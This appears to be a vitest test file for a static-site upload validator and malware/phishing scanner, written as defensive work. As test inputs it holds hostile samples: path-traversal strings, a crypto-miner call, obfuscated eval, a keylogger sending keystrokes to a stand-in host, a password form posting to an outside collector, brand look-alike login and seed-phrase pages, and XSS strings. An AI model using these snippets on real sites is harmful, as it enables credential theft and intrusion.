import { describe, expect, it } from "vitest";
import { UPLOAD_LIMITS } from "@/config/limits";
import { detectCoverType } from "@/lib/upload/mime";
import { scanFiles } from "@/lib/upload/scan";
import { normalizePath, stripCommonRoot, validateUpload } from "@/lib/upload/validate";

const enc = new TextEncoder();
const text = (path: string, body: string) => ({ path, bytes: enc.encode(body) });
const PNG_BYTES = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0]);
const html = "<!doctype html><title>x</title><h1>Hi</h1>";

describe("normalizePath", () => {
  it.each([
    ["index.html", "index.html"],
    ["./css/site.css", "css/site.css"],
    ["img\\logo.png", "img/logo.png"],
    ["a//b/./c.js", "a/b/c.js"],
  ])("%s → %s", (raw, expected) => {
    expect(normalizePath(raw)).toEqual({ ok: true, path: expected });
  });

  it.each(["../secret.txt", "a/../../b", "/etc/passwd", "C:/Windows/x", "a\0b", "a/<b>.html", ""])(
    "rejects %j",
    (raw) => {
      expect(normalizePath(raw).ok).toBe(false);
    },
  );

  it("rejects deep nesting and long paths", () => {
    expect(
      normalizePath(
        Array(UPLOAD_LIMITS.maxPathDepth + 1)
          .fill("d")
          .join("/") + ".html",
      ).ok,
    ).toBe(false);
    expect(normalizePath("x".repeat(UPLOAD_LIMITS.maxPathLength + 1)).ok).toBe(false);
  });
});

describe("stripCommonRoot", () => {
  it("drops a single wrapping folder", () => {
    expect(stripCommonRoot(["site/index.html", "site/css/a.css"])).toEqual([
      "index.html",
      "css/a.css",
    ]);
  });
  it("leaves mixed roots alone", () => {
    expect(stripCommonRoot(["index.html", "css/a.css"])).toEqual(["index.html", "css/a.css"]);
  });
});

describe("validateUpload", () => {
  it("accepts a normal static site and finds the entry point", () => {
    const res = validateUpload([
      text("my-site/index.html", html),
      text("my-site/style.css", "body{}"),
      { path: "my-site/logo.png", bytes: PNG_BYTES },
      text("my-site/.DS_Store", "junk"),
    ]);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.entryPath).toBe("index.html");
    expect(res.files.map((f) => f.path)).toEqual(["index.html", "logo.png", "style.css"]);
    expect(res.dropped).toEqual(["my-site/.DS_Store"]);
    expect(res.files.find((f) => f.path === "logo.png")?.mime).toBe("image/png");
  });

  it("turns a single HTML file into index.html", () => {
    const res = validateUpload([text("landing.html", html)]);
    expect(res).toMatchObject({ ok: true, entryPath: "index.html" });
  });

  it("requires an index.html when there are several pages", () => {
    const res = validateUpload([text("a.html", html), text("b.html", html)]);
    expect(res).toMatchObject({
      ok: false,
      issues: [{ message: expect.stringMatching(/index\.html/) }],
    });
  });

  it("explains that source projects need a build first", () => {
    const res = validateUpload([text("index.html", html), text("src/App.tsx", "export default 1")]);
    expect(res).toMatchObject({ ok: false, issues: [{ message: expect.stringMatching(/build/) }] });
    const pkg = validateUpload([text("package.json", "{}"), text("src/main.js", "")]);
    expect(pkg.ok).toBe(false);
  });

  it.each([
    [".env", "Remove .env"],
    ["config/.env.local", "Remove .env"],
    [".git/config", ".git"],
    ["node_modules/x/index.js", "node_modules"],
    ["certs/server.key", "key files"],
    ["id_rsa", "SSH keys"],
  ])("refuses %s", (path, message) => {
    const res = validateUpload([text("index.html", html), text(path, "x")]);
    expect(res).toMatchObject({
      ok: false,
      issues: [{ message: expect.stringContaining(message) }],
    });
  });

  it("refuses unsupported file types such as executables", () => {
    const res = validateUpload([
      text("index.html", html),
      { path: "setup.exe", bytes: new Uint8Array([0x4d, 0x5a]) },
    ]);
    expect(res).toMatchObject({ ok: false, issues: [{ path: "setup.exe" }] });
  });

  it("refuses files whose bytes don't match their extension", () => {
    const res = validateUpload([
      text("index.html", html),
      text("photo.png", "<script>alert(1)</script>"),
    ]);
    expect(res).toMatchObject({
      ok: false,
      issues: [{ path: "photo.png", message: expect.stringMatching(/match/) }],
    });
  });

  it("refuses binary data in text files", () => {
    const res = validateUpload([{ path: "index.html", bytes: new Uint8Array([0x3c, 0x00, 0xff]) }]);
    expect(res.ok).toBe(false);
  });

  it("enforces size and count limits", () => {
    const big = new Uint8Array(UPLOAD_LIMITS.maxFileBytes + 1).fill(0x61);
    expect(validateUpload([text("index.html", html), { path: "big.txt", bytes: big }]).ok).toBe(
      false,
    );

    const many = Array.from({ length: UPLOAD_LIMITS.maxFiles + 1 }, (_, i) =>
      text(`f${i}.txt`, "x"),
    );
    expect(validateUpload([text("index.html", html), ...many]).ok).toBe(false);

    const chunk = new Uint8Array(UPLOAD_LIMITS.maxFileBytes - 10).fill(0x61);
    const tooMuch = Array.from({ length: 3 }, (_, i) => ({ path: `part${i}.txt`, bytes: chunk }));
    expect(validateUpload([text("index.html", html), ...tooMuch]).ok).toBe(false);
  });

  it("rejects duplicate names that differ only by case", () => {
    expect(
      validateUpload([text("index.html", html), text("A.css", ""), text("a.css", "")]).ok,
    ).toBe(false);
  });
});

describe("scanFiles", () => {
  const scan = (path: string, body: string) =>
    scanFiles([{ path, bytes: enc.encode(body), isText: true }]);

  it("passes ordinary templates", () => {
    const res = scan(
      "index.html",
      `<form><input type="email"><input type="password"></form><script>document.querySelector('form').onsubmit=e=>e.preventDefault()</script>`,
    );
    expect(res).toEqual({ blocking: [], flags: [] });
  });

  it("blocks private keys and secret API keys", () => {
    expect(scan("a.js", "-----BEGIN RSA PRIVATE KEY-----\nabc").blocking).toHaveLength(1);
    expect(scan("a.js", `const k = "sk-ant-api03-${"a".repeat(30)}"`).blocking[0]?.rule).toBe(
      "secret.api_key",
    );
    expect(scan("a.js", `const k = "AKIAABCDEFGHIJKLMNOP"`).blocking).toHaveLength(1);
    expect(scan("a.js", `const k = "sk_live_${"a".repeat(24)}"`).blocking).toHaveLength(1);
  });

  it("allows publishable keys that are meant to be public", () => {
    expect(
      scan("a.js", `const k = "pk_live_${"a".repeat(24)}"; const s = "sb_publishable_abc"`)
        .blocking,
    ).toEqual([]);
  });

  it("flags miners, obfuscated eval and packed payloads", () => {
    expect(scan("a.js", "var miner = new CoinHive.Anonymous('x')").flags[0]?.rule).toBe(
      "malware.miner",
    );
    expect(scan("a.js", "eval(atob('ZG9jdW1lbnQ='))").flags[0]?.rule).toBe(
      "malware.obfuscated_eval",
    );
    expect(scan("a.js", `var p = "${"A".repeat(9000)}";`).flags[0]?.rule).toBe(
      "malware.packed_payload",
    );
  });

  it("flags password forms that post to other sites", () => {
    const res = scan(
      "index.html",
      `<form action="https://collector.example/x"><input type="password"></form>`,
    );
    expect(res.flags.map((f) => f.rule)).toContain("phishing.external_password_form");
  });

  it("flags brand look-alike sign-in pages and seed phrase requests", () => {
    expect(
      scan("index.html", `<h1>Sign in to PayPal</h1><input type="password">`).flags[0]?.rule,
    ).toBe("phishing.brand_login");
    expect(
      scan("index.html", `<p>Enter your secret recovery phrase</p><textarea></textarea>`).flags[0]
        ?.rule,
    ).toBe("phishing.seed_phrase");
  });

  it("flags keyloggers that send keystrokes away", () => {
    const res = scan(
      "a.js",
      `document.addEventListener('keydown', e => navigator.sendBeacon('https://x.example', e.key))`,
    );
    expect(res.flags.map((f) => f.rule)).toContain("malware.keylogger");
  });

  it("ignores binary files", () => {
    expect(scanFiles([{ path: "a.png", bytes: enc.encode("coinhive"), isText: false }])).toEqual({
      blocking: [],
      flags: [],
    });
  });
});

describe("detectCoverType", () => {
  it("recognizes raster images by their bytes", () => {
    expect(detectCoverType(PNG_BYTES)).toEqual({ mime: "image/png", ext: "png" });
    expect(detectCoverType(new Uint8Array([0xff, 0xd8, 0xff, 0xe0]))?.ext).toBe("jpg");
  });
  it("refuses SVG and anything else", () => {
    expect(detectCoverType(enc.encode("<svg onload=alert(1)>"))).toBeNull();
  });
});
